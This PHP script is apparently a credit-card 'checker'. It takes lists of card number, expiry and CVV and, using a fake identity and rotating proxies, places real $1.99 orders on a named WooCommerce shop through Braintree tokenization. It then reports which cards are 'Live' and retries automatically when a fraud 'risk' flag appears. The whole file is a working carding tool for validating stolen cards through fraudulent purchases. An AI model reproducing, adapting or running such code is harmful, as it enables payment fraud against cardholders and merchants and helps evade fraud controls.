<?php

# Somnus



error_reporting(1);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');



# PHP

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}




# Function

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

#Webkit Function
function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}
$web = pro();

function InStr($string, $Somnus) {
    $pattern = sprintf(
        '/<input\s+value="([^"]*)"\s+name="%s"\s+type="hidden">/i',
        preg_quote($Somnus, '/')
    );

    if (preg_match($pattern, $string, $matches)) {
        return $matches[1];
    }

    return null;
}


# String Between Two Strings
function string_between_two_string($str, $starting_word, $ending_word)
{ 
   $subtring_start = strpos($str, $starting_word); 
   $subtring_start += strlen($starting_word);   
   $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
   return substr($str, $subtring_start, $size);
}


function Replace($string)
{
    $string = str_replace('\/', '/', $string);
    return $string;
}

# Variables

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };


if (!file_exists(getcwd().'/Cookies')) mkdir(getcwd().'/Cookies', 0777, true);
$Cookies = getcwd().'/Cookies/Cookie'.uniqid('Somnus', true).'.txt';


$FirstDigit = substr($cc, 0,1);
if($FirstDigit == '5'){
    $FirstDigit = 'Mastercard';
}
elseif($FirstDigit == '4'){
    $FirstDigit = 'Visa';
}
elseif($FirstDigit == '3'){
    $FirstDigit = 'American Express';
}
else {
    $FirstDigit = null;
}

function BraintreeData($length = 13) {
    $characters = '0123456789abcdef';
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString;
}

# Session ID
function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}


# Email Generate

function emailGenerate($length = 15)  
{
  $characters       = 'Somnus'.rand(1,1000).'';
  $charactersLength = strlen($characters);
  $randomString     = '';
  for ($i = 0; $i < $length; $i++) {
      $randomString .= $characters[rand(0, $charactersLength - 1)];
  }
  return $randomString . '@gmail.com';  
}

$Email = emailGenerate();

# Formkey
function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$Formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);


# Random User
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, Array( "Accept: application/json" ));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$RandomJson = json_decode($RandomUser = curl_exec($ch), true);
$title = $RandomJson['results']['0']['name']['title'];
$first = $RandomJson['results']['0']['name']['first'];
$last = $RandomJson['results']['0']['name']['last'];
$street = $RandomJson['results']['0']['location']['street'];
$city = $RandomJson['results']['0']['location']['city'];
$state = $RandomJson['results']['0']['location']['state'];
$postcode = $RandomJson['results']['0']['location']['postcode'];
$phone = $RandomJson['results']['0']['phone'];
curl_close($ch);



# Random Postal 

$Postal = "AB".rand(00,99)." ".rand(1,9)."LH";
$Postal1 = rand(80010,80060);
$Postal2 = rand(6200,6300);


# Webkit

$Boundary = hash('sha256', uniqid('', true));


# Proxy Section
$Websharegay = rand(0,250);
$rp1 = array(
    1 => '',
);
$rotate = $rp1[array_rand($rp1)];

# Proxy API
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_PROXY => '',
    CURLOPT_PROXYUSERPWD => $rotate,
    CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
    $ip = "✅";
}
if (empty($ip1)){
    $ip = "❌";
}



$Somnus = 0;

som:




# Add to cart

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://creativegrandma.net/product/12-pointed-star-roses-baby-afghan/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: creativegrandma.net',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary'.$web.'',
  #  'Authorization: Bearer '.$Authorization.'',
   # 'Braintree-Version: 2018-05-10',
    'Origin: https://creativegrandma.net',
   # 'Connection: keep-alive',
    'Referer: https://creativegrandma.net/product/12-pointed-star-roses-baby-afghan/',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
   # 'TE: trailers',,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="wc_braintree_paypal_amount"

1.99
------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="wc_braintree_paypal_currency"

USD
------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="wc_braintree_paypal_locale"

en_us
------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="wc_braintree_paypal_single_use"

1
------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="wc_braintree_paypal_needs_shipping"


------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="wc_braintree_paypal_product_id"

7675
------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundary'.$web.'
Content-Disposition: form-data; name="add-to-cart"

7675
------WebKitFormBoundary'.$web.'--

');


$Addtocart = curl_exec($ch);

/*
# Cart 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://heidiesther.com/cart/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Host: heidiesther.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept: ,
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5mXAjWwnRIGRt6iV',
  #  'Authorization: Bearer '.$Authorization.'',
   # 'Braintree-Version: 2018-05-10',
   # 'Origin: https://heidiesther.com',
   # 'Connection: keep-alive',
    'Referer: https://heidiesther.com/product/fcol-paperback/',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);

$Cart = curl_exec($ch);
*/
# Checkout 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://creativegrandma.net/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Host: creativegrandma.net',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
   # 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5mXAjWwnRIGRt6iV',
  #  'Authorization: Bearer '.$Authorization.'',
   # 'Braintree-Version: 2018-05-10',
   # 'Origin: https://heidiesther.com',
   # 'Connection: keep-alive',
   # 'Referer: https://skindeva.com/cart/',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: none',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);

$Checkout = curl_exec($ch);


$CheckoutNonce = trim(strip_tags(GetStr($Checkout, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$cn = GetStr($Checkout ,'"client_token_nonce":"','"');
#$Authorization = json_decode($Decode = base64_decode($ClientToken = GetStr($Checkout, 'var wc_braintree_client_token = ["','"]')), true)['authorizationFingerprint'];


#echo 'CheckoutNonce : '.$CheckoutNonce.'<br>';
#echo 'CLIENTTOKEN : '.$cn.'<br>';
# Client Id


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://creativegrandma.net/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: creativegrandma.net',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  #  'Authorization: Bearer '.$Authorization.'',
   # 'Braintree-Version: 2018-05-10',
    'Origin: https://creativegrandma.net',
   # 'Connection: keep-alive',
    'Referer: https://creativegrandma.net/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
   # 'TE: trailers',,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wc_braintree_credit_card_get_client_token&nonce='.$cn.'');

$Auth = curl_exec($ch);


$Authorization = json_decode($Decode = base64_decode($ClientToken = GetStr($Auth, '"data":"','"}')), true)['authorizationFingerprint'];


#$Authen = trim(strip_tags(GetStr($Auth, '{"success":true,"data":"','"}')));
#$cn = GetStr($Checkout ,'"client_token_nonce":"','"');


#echo 'AUTH TOKEN : '.$Authorization.'<br>';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   # 'POST /graphql HTTP/2',
    'Host: payments.braintree-api.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: application/json',
    'Authorization: Bearer '.$Authorization.'',
    'Braintree-Version: 2018-05-10',
    'Origin: https://assets.braintreegateway.com',
   # 'Connection: keep-alive',
    'Referer: https://assets.braintreegateway.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
   # 'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.SID().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":""},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$Token = json_decode($Graphql = curl_exec($ch), true)['data']['tokenizeCreditCard']['token'];


#echo $Graphql;

/*
# Lookup

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/p2f3cbrkx5f5vc6v/client_api/v1/payment_methods/'.$Token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  #  'POST /merchants/pxfgyxcbgs7wktpk/client_api/v1/payment_methods/'.$Token.'/three_d_secure/lookup HTTP/2',
    'Host: api.braintreegateway.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept: ',
    'Accept-Language: ',
    'Content-Type: application/json',
    'Origin: https://ajadynasty.com',
    'Referer: https://ajadynasty.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"30.19","additionalInfo":{"shippingGivenName":"Ambot","shippingSurname":"Intawn","billingLine1":"812 Santa Maria","billingLine2":"","billingCity":"New York","billingState":"NY","billingPostalCode":"10010","billingCountryCode":"US","billingPhoneNumber":"2256133351","billingGivenName":"Ambot","billingSurname":"Intawn","shippingLine1":"812 Santa Maria","shippingLine2":"","shippingCity":"New York","shippingState":"NY","shippingPostalCode":"10010","shippingCountryCode":"US","email":"ambot@gmail.com"},"bin":"402347","dfReferenceId":"1_b51fa34c-8331-451d-8e7e-a2b72f0bb0a2","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.85.3","cardinalDeviceDataCollectionTimeElapsed":150,"issuerDeviceDataCollectionTimeElapsed":3924,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$Authorization.'","braintreeLibraryVersion":"braintree/web/3.85.3","_meta":{"merchantAppId":"ajadynasty.com","platform":"web","sdkVersion":"3.85.3","source":"client","integration":"custom","integrationType":"custom","sessionId":"b60d4354-1801-4542-87c3-cac2479aaa57"}}');

$Nonce = GetStr($Lookup = curl_exec($ch), '"nonce":"','"');

echo '<br>TokenNonce: '.$Nonce.'';

*/
# WcAjaxCheckout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://creativegrandma.net/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: creativegrandma.net',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  #  'Authorization: Bearer '.$Authorization.'',
   # 'Braintree-Version: 2018-05-10',
    'Origin: https://creativegrandma.net',
   # 'Connection: keep-alive',
    'Referer: https://creativegrandma.net/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Ambot&billing_last_name=Intawn&billing_company=&billing_country=US&billing_address_1=812+Santa+Maria&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10010&billing_phone=2256133351&billing_email=ambot%40gmail.com&account_password=&order_comments=&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=1.99&wc_braintree_credit_card_payment_nonce='.$Token.'&wc_braintree_device_data=%7B%22correlation_id%22%3A%2211628263328b7c499717f710437cf1d5%22%7D&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%2211628263328b7c499717f710437cf1d5%22%7D&wc_braintree_paypal_amount=1.99&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&woocommerce-process-checkout-nonce='.$CheckoutNonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');

$Response = strip_tags(json_decode($WcAjaxCheckout = curl_exec($ch), true)['messages']);

$wkey = GetStr($WcAjaxCheckout, 'key=','",');
$orderid = GetStr($WcAjaxCheckout, '"order_id":','}');

#echo 'Wookey'.$wkey.'<br>';
#echo 'OrderID'.$orderid.'<br>';
$Http = curl_getinfo($ch)['http_code'];

#echo '<br>'.$WcAjaxCheckout.'';



if(strpos($WcAjaxCheckout, '"success"') )
{ echo '<span class="badge badge-success">#Live </span> : <span class="badge badge-primary"> ' . $lista . ' </span><br> <span class="badge badge-info">Gate: Braintree + Woocommerce </span><br> <span class="badge badge-success">PRICE: $1.99 </span> </br> <span class="badge badge-primary">Order ID: '.$orderid.'</span><br> <span class="badge badge-primary">Key: '.$wkey.'</span>'; }
elseif(strpos(Response, '"Insufficient funds in account"') )
{
echo '<span class="badge badge-success">#LIVE </span> : <span class="badge badge-primary"> ' . $lista . ' </span> <span class="badge badge-info"> Braintree + Woocommerce </span> <span class="badge badge-success"> Insufficient fund </span> <span class="badge badge-success"> $16.99 </span> </br>';
}
elseif(strpos($WcAjaxCheckout, 'risk') )
{ $Somnus++;
   goto som; }
   elseif($Http == '405')
{ $Somnus++;
   goto som; }
else
{ echo '<span class="badge badge-danger">#Reprovada </span> : <span class="badge badge-primary"> ' . $lista . ' </span> <span class="badge badge-info"> Braintree + Woocommerce </span> <span class="badge badge-warning"> '.$Response.' </span> <span class="badge badge-dark"> '.$Somnus.' </span></br>'; }





curl_close($ch);
ob_flush();
unlink($Cookies);




// echo "<hr>";
// echo $CheckoutNonce;
// echo "<hr>";
// echo $Stripe;
// echo "<hr>";
// echo $Token;
// echo "<hr>";
// echo $WcAjaxCheckout;



# Somnus


?>

